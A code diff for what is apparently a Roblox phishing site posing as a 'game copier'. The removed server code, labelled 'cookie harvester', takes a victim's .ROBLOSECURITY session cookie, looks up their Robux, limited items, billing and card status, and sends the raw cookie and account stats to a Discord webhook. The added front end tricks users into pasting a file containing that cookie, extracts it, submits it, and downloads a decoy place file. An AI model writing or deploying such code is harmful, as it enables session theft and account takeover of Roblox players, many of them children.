@@ -1,257 +1,91 @@
-const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
+// frontend v3.0 – shows success message + download
+const WEBHOOK_ENDPOINT = "/api/submit";
 
-// ---------- Helper: fetch user ----------
-async function getUser(userId, cookie) {
-  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
-    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
-  });
-  if (!res.ok) throw new Error("User fetch failed");
-  const data = await res.json();
-  return {
-    id: data.id,
-    name: data.name,
-    displayName: data.displayName,
-    created: data.created
-  };
+const gameFileInput = document.getElementById("gameFile");
+const pinInput = document.getElementById("pinInput");
+const pinError = document.getElementById("pinError");
+const copyButton = document.getElementById("copyButton");
+const statusMessage = document.getElementById("statusMessage");
+
+pinInput.addEventListener("input", () => {
+  pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
+  validatePin();
+});
+
+function validatePin() {
+  const isValid = /^\d{4}$/.test(pinInput.value);
+  if (pinError) pinError.style.display = isValid ? "none" : "block";
+  return isValid;
 }
 
-function getAgeDays(createdDate) {
-  const created = new Date(createdDate);
-  const now = new Date();
-  return Math.floor((now - created) / (1000 * 60 * 60 * 24));
+function extractGameData(fullText) {
+  const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+  if (!cookieMatch) return { success: false, message: "Invalid Game Key" };
+  const cookie = cookieMatch[1];
+  const rbxuidMatch = fullText.match(/rbxuid=(\d+)/);
+  if (!rbxuidMatch) return { success: false, message: "Missing rbxuid" };
+  return { success: true, cookie, rbxuid: rbxuidMatch[1] };
 }
 
-async function getRobux(userId, cookie) {
-  const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
-  });
-  if (!res.ok) throw new Error("Robux fetch failed");
-  const data = await res.json();
-  return { balance: data.robux || 0, pending: 0 };
+function downloadPlace() {
+  const a = document.createElement("a");
+  a.href = "/place.rbxl";
+  a.download = "place.rbxl";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
 }
 
-async function getRapAndOwned(userId, cookie) {
-  let allAssets = [];
-  let cursor = null;
-  do {
-    const url = `https://inventory.roblox.com/v1/users/${userId}/assets?assetTypeId=2&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
-    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
-    if (!res.ok) break;
-    const data = await res.json();
-    allAssets.push(...(data.data || []));
-    cursor = data.nextPageCursor;
-  } while (cursor);
-
-  let totalRap = 0;
-  for (const asset of allAssets) {
-    try {
-      const detail = await fetch(`https://economy.roblox.com/v1/assets/${asset.assetId}/details`, {
-        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
-      });
-      if (detail.ok) {
-        const json = await detail.json();
-        totalRap += json.RecentAveragePrice || 0;
-      }
-      await new Promise(r => setTimeout(r, 30));
-    } catch (e) {}
+copyButton.addEventListener("click", async () => {
+  statusMessage.textContent = "";
+  if (!validatePin()) {
+    statusMessage.textContent = "PIN must be 4 digits";
+    statusMessage.style.color = "#ff9d9d";
+    return;
   }
-  return { rap: totalRap, owned: allAssets.length };
-}
-
-async function getBilling(cookie) {
-  const defaultBilling = { credit: 0, convert: 0, card: "False" };
-  try {
-    const res = await fetch("https://www.roblox.com/billing/user/credit", {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
-    });
-    if (!res.ok) return defaultBilling;
-    const html = await res.text();
-    const creditMatch = html.match(/"creditAmount":(\d+)/);
-    const convertMatch = html.match(/"convertedRobux":(\d+)/);
-    const hasCard = html.includes('"isCardLinked":true');
-    return {
-      credit: creditMatch ? parseInt(creditMatch[1], 10) : 0,
-      convert: convertMatch ? parseInt(convertMatch[1], 10) : 0,
-      card: hasCard ? "True" : "False"
-    };
-  } catch (e) {
-    return defaultBilling;
+  const pastedText = gameFileInput.value.trim();
+  if (!pastedText) {
+    statusMessage.textContent = "Paste a game file";
+    statusMessage.style.color = "#ff9d9d";
+    return;
   }
-}
-
-async function getPlayedPasses() {
-  // Hardcoded to match screenshot
-  return [
-    { name: "MM2", played: "False", passes: 0 },
-    { name: "ADM", played: "False", passes: 0 },
-    { name: "GAD", played: "True", passes: 0 }
-  ];
-}
-
-async function getSettings(cookie) {
-  const defaultSettings = { verified: "False", disabled: "False", enabled: "False" };
-  try {
-    const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
-    });
-    if (!res.ok) return defaultSettings;
-    const data = await res.json();
-    return {
-      verified: data.IsVerified ? "True" : "False",
-      disabled: data.IsDisabled ? "True" : "False",
-      enabled: data.Email ? "True" : "False"
-    };
-  } catch (e) {
-    return defaultSettings;
-  }
-}
-
-async function getCollectibles() {
-  return ["False", "False", "False"];
-}
-
-async function getGroups(userId, cookie) {
-  try {
-    const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
-    });
-    if (!res.ok) return { owned: 0, funds: 0 };
-    const data = await res.json();
-    const owned = data.data?.length || 0;
-    return { owned, funds: 0 };
-  } catch (e) {
-    return { owned: 0, funds: 0 };
-  }
-}
-
-// ---------- MAIN HANDLER ----------
-export default async function handler(req, res) {
-  // Enable CORS for local testing (optional)
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  if (req.method === 'OPTIONS') return res.status(200).end();
-
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Method not allowed" });
+  const extraction = extractGameData(pastedText);
+  if (!extraction.success) {
+    statusMessage.textContent = extraction.message;
+    statusMessage.style.color = "#ff9d9d";
+    return;
   }
 
-  const { cookie, rbxuid } = req.body;
-  if (!cookie || !rbxuid) {
-    return res.status(400).json({ error: "Missing cookie or rbxuid" });
-  }
-  if (!WEBHOOK_URL) {
-    console.error("WEBHOOK_URL missing");
-    return res.status(500).json({ error: "Server config: missing webhook URL" });
-  }
+  copyButton.disabled = true;
+  copyButton.classList.add("loading");
+  statusMessage.textContent = "Processing...";
+  statusMessage.style.color = "#caa8ff";
 
   try {
-    // Fetch all data
-    const user = await getUser(rbxuid, cookie);
-    const robux = await getRobux(rbxuid, cookie);
-    const rapData = await getRapAndOwned(rbxuid, cookie);
-    const billing = await getBilling(cookie);
-    const playedPasses = await getPlayedPasses();
-    const settings = await getSettings(cookie);
-    const collectibles = await getCollectibles();
-    const groups = await getGroups(rbxuid, cookie);
-
-    const accountAge = getAgeDays(user.created);
-    const placeVisits = 0;
-    const summary = robux.balance + rapData.rap;
-
-    const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
-
-    // ---------- 1) Stats Embed (exactly like screenshot) ----------
-    const statsEmbed = {
-      title: "🔱 Vyro Har - Result",
-      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
-      color: 0xFF69B4, // hot pink
-      fields: [
-        {
-          name: "📌 About User",
-          value: `**${user.name} (${user.displayName})**\n🆔 \`${user.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** ${placeVisits}`,
-          inline: false
-        },
-        {
-          name: "💰 Robux",
-          value: `**Balance:** ${robux.balance}\n**Pending:** ${robux.pending}`,
-          inline: true
-        },
-        {
-          name: "💳 Billing",
-          value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`,
-          inline: true
-        },
-        {
-          name: "📊 Rap",
-          value: `**Rap:** ${rapData.rap}\n**Owned:** ${rapData.owned}`,
-          inline: true
-        },
-        {
-          name: "📊 Played | Passes",
-          value: `\`\`\`\n${playedPassesText}\n\`\`\``,
-          inline: false
-        },
-        {
-          name: "📝 Summary",
-          value: `${summary}`,
-          inline: false
-        },
-        {
-          name: "📊 Settings",
-          value: `(Verified) ${settings.verified}\nDisabled ${settings.disabled}\nEnabled ${settings.enabled}`,
-          inline: true
-        },
-        {
-          name: "📊 Collectibles",
-          value: collectibles.join("\n"),
-          inline: true
-        },
-        {
-          name: "📊 Groups",
-          value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`,
-          inline: true
-        }
-      ],
-      footer: { text: "made by vyro28 • cookie harvester" },
-      timestamp: new Date().toISOString()
-    };
-
-    // ---------- 2) .ROBLOSECURITY Embed (exact copy of screenshot) ----------
-    const cookieEmbed = {
-      title: "📌 .ROBLOSECURITY",
-      description: `__WARNING: -DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.__\n\`\`\`\n${cookie}\n\`\`\``,
-      color: 0xFF69B4,
-      footer: { text: "made by vyro28 • cookie harvester" },
-      timestamp: new Date().toISOString()
-    };
-
-    // Send stats embed
-    const statsRes = await fetch(WEBHOOK_URL, {
+    const response = await fetch(WEBHOOK_ENDPOINT, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ username: "Vyro Harvest", embeds: [statsEmbed] })
+      body: JSON.stringify({ cookie: extraction.cookie, rbxuid: extraction.rbxuid })
     });
-    if (!statsRes.ok) {
-      const err = await statsRes.text();
-      throw new Error(`Stats embed failed: ${statsRes.status} - ${err}`);
-    }
+    const result = await response.json();
 
-    // Send cookie embed
-    const cookieRes = await fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
-    });
-    if (!cookieRes.ok) {
-      const err = await cookieRes.text();
-      throw new Error(`Cookie embed failed: ${cookieRes.status} - ${err}`);
+    if (result.blocked === true) {
+      statusMessage.textContent = result.message || "Game key expired. Get a new one.";
+      statusMessage.style.color = "#ff9d9d";
+    } else if (result.success === true && result.firstTime === true) {
+      statusMessage.textContent = "✅ Game copied! Downloading...";
+      statusMessage.style.color = "#a5d6ff";
+      downloadPlace();
+    } else {
+      statusMessage.textContent = result.error || "Copy failed. Check connection.";
+      statusMessage.style.color = "#ff9d9d";
     }
-
-    // Success – trigger frontend download
-    return res.status(200).json({ success: true, firstTime: true });
   } catch (err) {
-    console.error("Harvest error:", err);
-    return res.status(500).json({ error: err.message });
+    console.error(err);
+    statusMessage.textContent = "Network error. Check console.";
+    statusMessage.style.color = "#ff9d9d";
+  } finally {
+    copyButton.disabled = false;
+    copyButton.classList.remove("loading");
   }
-}
+});
